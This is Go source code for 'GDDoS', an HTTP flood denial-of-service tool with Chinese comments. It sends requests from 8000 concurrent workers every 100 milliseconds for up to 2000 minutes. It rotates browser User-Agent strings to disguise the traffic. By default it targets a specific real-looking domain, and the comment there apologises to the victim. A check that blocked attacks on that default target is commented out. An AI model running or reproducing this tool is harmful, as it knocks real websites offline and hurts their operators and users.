package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/gookit/color"
)

var (
	Method              string
	TargetUrl           string
	IntervalMillisecond int
	ConcurrencyCount    int
	DurationMinute      int

	//TODO：Http Proxy
	DDosHttpClient = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
				dialer := net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 60 * time.Second,
				}
				return dialer.Dial(network, addr)
			},
		},
	}
	UserAgents = []string{
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
		"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
		"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
	}
)

// 主程序
func main() {
	defaultTargetUrl := "https://xljtj.com" // 对不住了，您

	flag.StringVar(&Method, "m", "GET", "DDos攻击目标URL请求方式(GET/POST/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "DDos攻击的目标URL")
	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发用户数量")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个用户执行DDos攻击的频率（毫秒）")
	flag.IntVar(&DurationMinute, "dm", 2000, "DDos攻击持续时间（分钟）")
	flag.Parse()

	/*if TargetUrl == defaultTargetUrl {
		color.Printf("TargetUrl is %s, 请尝试通过命令行传参数重新启动(TargetUrl 不能等于 defaultTargetUrl)。Usage：<red>./goddos -h</>\n", TargetUrl)
		return
	}
	*/

	go func() {
		for i := 0; i < ConcurrencyCount; i++ {
			go DoAttacking(i)
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
}

// 该方法用于攻击
func DoAttacking(grindex int) {
	for i := 0; ; i++ {
		if result, err := DoHttpRequest(); err != nil {
			color.Printf("[GDDoS#%d/%d]<red>(%s)</>\n", grindex, i, err.Error())
		} else {
			responseStatus := fmt.Sprintf("<green>(%s)</>", *result)
			if !strings.Contains(*result, "200 OK") {
				responseStatus = fmt.Sprintf("<red>(%s)</>", *result)
			}
			color.Printf("[GDDoS#%d/%d]%s\n", grindex, i, responseStatus)
		}
		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
	}
}

// 该方法用于发送HTTP请求
func DoHttpRequest() (*string, error) {
	request, err := http.NewRequest(Method, TargetUrl, nil)
	if err != nil {
		return nil, err
	}
	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
	request.Header.Set("By", "GDDoS")

	response, err := DDosHttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	// Ignore and read the responseBody
	_, _ = ioutil.ReadAll(response.Body)

	return &response.Status, err
}

// TODO: Add Log
